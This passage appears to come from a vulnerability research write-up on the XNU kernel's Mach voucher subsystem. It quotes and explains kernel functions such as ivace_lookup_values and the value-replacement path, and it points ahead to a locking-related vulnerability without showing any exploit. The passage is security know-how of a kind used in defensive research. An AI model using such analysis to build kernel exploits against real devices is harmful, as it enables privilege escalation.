 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">iv_lookup</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ipc_voucher_t iv</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;iv_index_t key_index</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">key_index </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;iv</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">iv_table_size</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;iv</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">iv_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">key_index</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;IV_UNUSED_VALINDEX</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>This value index uniquely identifies an existing attribute value, but you need to ask the attribute&#39;s controller for the actual value. Before getting that previous value </span><span>though, the</span><span>&nbsp;code first determines whether this sub-recipe might be trying to refer to the value currently stored by this voucher or has explicitly passed in a </span><span class="BGLtzooHlW-c11">previous_voucher</span><span class="BGLtzooHlW-c10">. The value in the previous voucher takes precedence over whatever is already in the under-construction voucher.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.f5a4045ea337ae1a6d9765b8d290b9e3f343559c"></a><a id="t.21"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; prev_val_index </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">IV_NULL </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;prev_voucher</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">?</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; iv_lookup</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">prev_voucher</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;key_index</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">:</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; save_val_index</span><span class="BGLtzooHlW-c2">;</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">Then the code looks up the actual previous value to operate on:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c19 BGLtzooHlW-c11"></span></p><a id="t.3d5b30b0ca79263b24534436b9c17b9f568c14c6"></a><a id="t.22"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace_lookup_values</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">key_index</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;prev_val_index</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; previous_vals</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">previous_vals_count</span><span class="BGLtzooHlW-c2">);</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">key_index</span><span>&nbsp;is the key we&#39;re operating on, </span><span class="BGLtzooHlW-c11">MACH_VOUCHER_ATTR_KEY_USER_DATA</span><span>&nbsp;in this example. This function is called </span><span class="BGLtzooHlW-c11">ivace_lookup_values</span><span>&nbsp;(note the plural). There are some comments in the voucher code indicating that maybe in the future values could themselves be put into a linked-list such that you could have larger values (or layered/chained values.) But this functionality isn&#39;t implemented; </span><span class="BGLtzooHlW-c11">ivace_lookup_values</span><span class="BGLtzooHlW-c10">&nbsp;will only ever return 1 value.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Here&#39;s </span><span class="BGLtzooHlW-c11">ivace_lookup_values</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.8394840551adb03f1e3384056efc45160047f0ab"></a><a id="t.23"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c6">void</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">ivace_lookup_values</span><span class="BGLtzooHlW-c2">(</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv_index_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;key_index</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; iv_index_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;value_index</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_value_handle_array_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;values</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; mach_voucher_attr_value_handle_array_size_t &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">count</span><span class="BGLtzooHlW-c2">)</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ipc_voucher_attr_control_t ivac</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac_entry_t ivace</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">IV_UNUSED_VALINDEX </span><span class="BGLtzooHlW-c2">==</span><span class="BGLtzooHlW-c4">&nbsp;value_index </span><span class="BGLtzooHlW-c2">||</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; MACH_VOUCHER_ATTR_KEY_NUM_WELL_KNOWN </span><span class="BGLtzooHlW-c2">&lt;=</span><span class="BGLtzooHlW-c4">&nbsp;key_index</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">count </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;iv_global_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">key_index</span><span class="BGLtzooHlW-c2">].</span><span class="BGLtzooHlW-c4">ivgte_control</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">IVAC_NULL </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/*</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* Get the entry and then the linked values.</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac_lock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">value_index </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">value_index</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/*</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;* TODO: support chained values (for effective vouchers).</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c7">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp;*/</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_refs </span><span class="BGLtzooHlW-c2">&gt;</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; values</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">]</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_value</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">count </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c10">The locking used in the vouchers code is very important for properly understanding the underlying vulnerability when we eventually get there, but for now I&#39;m glossing over it and we&#39;ll return to examine the relevant locks when necessary.</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Let&#39;s discuss the </span><span class="BGLtzooHlW-c11">ivace_lookup_values</span><span>&nbsp;code. They index the </span><span class="BGLtzooHlW-c11">iv_global_table</span><span class="BGLtzooHlW-c10">&nbsp;to get a pointer to the attribute type&#39;s controller:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.93bdc79665655f06bb0a73947fc8e84ad29d789b"></a><a id="t.24"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;iv_global_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">key_index</span><span class="BGLtzooHlW-c2">].</span><span class="BGLtzooHlW-c4">ivgte_control</span><span class="BGLtzooHlW-c2">;</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>They take that controller&#39;s lock then index its </span><span class="BGLtzooHlW-c11">ivac_table</span><span>&nbsp;to find that value&#39;s </span><span class="BGLtzooHlW-c11">struct ivac_entry_s</span><span>&nbsp;and read the </span><span class="BGLtzooHlW-c11">ivace_value</span><span class="BGLtzooHlW-c10">&nbsp;value from there:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.dd7ea114ff79be6833293594657c2e978bc73a24"></a><a id="t.25"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac_lock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">value_index </span><span class="BGLtzooHlW-c2">&lt;</span><span class="BGLtzooHlW-c4">&nbsp;ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table_size</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivace </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivac_table</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c4">value_index</span><span class="BGLtzooHlW-c2">];</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c8"><span class="BGLtzooHlW-c3"></span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">assert</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_refs </span><span class="BGLtzooHlW-c2">&gt;</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; values</span><span class="BGLtzooHlW-c2">[</span><span class="BGLtzooHlW-c15">0</span><span class="BGLtzooHlW-c2">]</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;ivace</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivace_value</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ivac_unlock</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">*</span><span class="BGLtzooHlW-c4">count </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c15">1</span><span class="BGLtzooHlW-c2">;</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span>Let&#39;s go back to the calling function (</span><span class="BGLtzooHlW-c11">ipc_replace_voucher_value</span><span class="BGLtzooHlW-c10">) and keep reading:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.a0e6fa2961c22bcc59d9cf5d3ac1f7a80569832f"></a><a id="t.26"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c7">/* Call out to resource manager to get new value */</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; new_value_voucher </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;IV_NULL</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; kr </span><span class="BGLtzooHlW-c2">=</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivam</span><span class="BGLtzooHlW-c2">-&gt;</span><span class="BGLtzooHlW-c4">ivam_get_value</span><span class="BGLtzooHlW-c2">)(</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivam</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;key</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;command</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; previous_vals</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;previous_vals_count</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; content</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;content_size</span><span class="BGLtzooHlW-c2">,</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">new_value</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">new_flag</span><span class="BGLtzooHlW-c2">,</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">&amp;</span><span class="BGLtzooHlW-c4">new_value_voucher</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">if</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">KERN_SUCCESS </span><span class="BGLtzooHlW-c2">!=</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">)</span><span class="BGLtzooHlW-c4">&nbsp;</span><span class="BGLtzooHlW-c2">{</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; ivac_release</span><span class="BGLtzooHlW-c2">(</span><span class="BGLtzooHlW-c4">ivac</span><span class="BGLtzooHlW-c2">);</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c6">return</span><span class="BGLtzooHlW-c4">&nbsp;kr</span><span class="BGLtzooHlW-c2">;</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; </span><span class="BGLtzooHlW-c2">}</span></p></td></tr></tbody></table>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">ivam-&gt;ivam_get_value</span><span>&nbsp;is calling the attribute type&#39;s function pointer which defines the meaning for the particular type of &quot;</span><span class="BGLtzooHlW-c11">get_value</span><span>&quot;. The term </span><span class="BGLtzooHlW-c11">get_value</span><span>&nbsp;here is a little confusing; aren&#39;t we trying to store a new value? (and there&#39;s no subsequent call to a method like &quot;</span><span class="BGLtzooHlW-c11">store_value</span><span>&quot;.) A better way to think about the semantics of </span><span class="BGLtzooHlW-c11">get_value</span><span>&nbsp;is that it&#39;s meant to evaluate both </span><span class="BGLtzooHlW-c11">previous_vals</span><span>&nbsp;(either the value from </span><span class="BGLtzooHlW-c11">previous_voucher</span><span>&nbsp;or the value currently in this voucher) and </span><span class="BGLtzooHlW-c11">content</span><span>&nbsp;(the arbitrary byte buffer from this sub-recipe) and combine/evaluate them to </span><span class="BGLtzooHlW-c14">create</span><span class="BGLtzooHlW-c10">&nbsp;a value representation. It&#39;s then up to the controller layer to store/cache that value. (Actually there&#39;s one tedious snag in this system which we&#39;ll get to involving locking...)</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5"><span class="BGLtzooHlW-c11">ivam_get_value</span><span>&nbsp;for the </span><span class="BGLtzooHlW-c11">user_data</span><span>&nbsp;attribute type is </span><span class="BGLtzooHlW-c11">user_data_get_value</span><span class="BGLtzooHlW-c10">:</span></p>
 <p class="BGLtzooHlW-c0 BGLtzooHlW-c5 BGLtzooHlW-c8"><span class="BGLtzooHlW-c10"></span></p><a id="t.65736db9786b611699f698b6e62ebfcd88a48199"></a><a id="t.27"></a><table class="BGLtzooHlW-c12"><tbody><tr class="BGLtzooHlW-c1"><td class="BGLtzooHlW-c13" colspan="1" rowspan="1">
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c6">static</span><span class="BGLtzooHlW-c3">&nbsp;kern_return_t</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">user_data_get_value</span><span class="BGLtzooHlW-c2">(</span></p>
 <p class="BGLtzooHlW-c0"><span class="BGLtzooHlW-c4">&nbsp; &nbsp; &nbsp; &nbsp; ipc_voucher_attr_manager_t &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;__assert_only manager</span><span class="BGLtzooHlW-c2">,</span></p>
